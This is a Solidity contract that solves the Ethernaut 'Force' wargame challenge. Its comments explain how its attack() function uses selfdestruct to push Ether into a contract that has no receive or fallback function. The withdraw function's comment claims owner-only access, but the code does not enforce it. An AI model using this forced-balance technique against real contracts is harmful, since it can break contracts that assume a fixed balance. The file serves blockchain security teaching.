// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

/// @title SendEtherToForce
/// @dev This contract demonstrates the "Force" challenge from Ethernaut.
/// 
/// CHALLENGE DESCRIPTION:
/// The goal is to send Ether to a contract (the "Force" victim contract) that has no 
/// `receive()` or `fallback()` functions, making it impossible to send Ether through 
/// normal calls. However, using `selfdestruct()` forces the transfer of any remaining 
/// balance to a target address, bypassing the usual protections.
/// 
/// KEY CONCEPTS:
/// - Contracts can refuse Ether if they don't implement `receive()` or `fallback()`
/// - `selfdestruct()` is a special operation that forces Ether transfer regardless of 
///   whether the recipient can receive it
/// - This demonstrates a potential vulnerability in contracts that assume they cannot 
///   receive Ether unintentionally
contract SendEtherToForce {
    /// @dev Tracks the original deployer/owner of this contract
    address private owner;

    /// @dev Initialize the owner to the contract deployer
    constructor() {
        owner = msg.sender;
    }

    /// @notice Send Ether to a target address using a low-level call
    /// @dev This method uses `.call{}` which will fail if the target rejects the transfer
    /// @param _force The target address to send Ether to
    function sendEtherToForce(address payable _force) external payable {
        (bool ok, ) = _force.call{value: msg.value}("");
        require(ok, "Transfer failed");
    }

    /// @notice Allow the owner to withdraw any remaining Ether from this contract
    /// @dev Only the owner can call this. Uses a low-level call for transfer.
    function withdraw() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "Transfer failed");
    }

    /// @notice Force send all Ether in this contract to a target address using selfdestruct
    /// @dev This is the attack method for the Force challenge.
    /// 
    /// HOW IT WORKS:
    /// - `selfdestruct()` is a special EVM opcode that:
    ///   1. Destroys the contract and all its state
    ///   2. Forces transfer of all remaining Ether to the specified address
    ///   3. Bypasses any `receive()` or `fallback()` guards
    /// 
    /// This is the solution to the Force challenge - send Ether to a contract that 
    /// cannot receive it through normal means by triggering this attack.
    /// 
    /// @param _force The target address that will receive this contract's Ether
    function attack(address payable _force) external payable {
        selfdestruct(_force);
    }

    /// @notice Allow this contract to receive Ether from any sender
    /// @dev Required to accept Ether in transactions without function calls
    receive() external payable {}
}
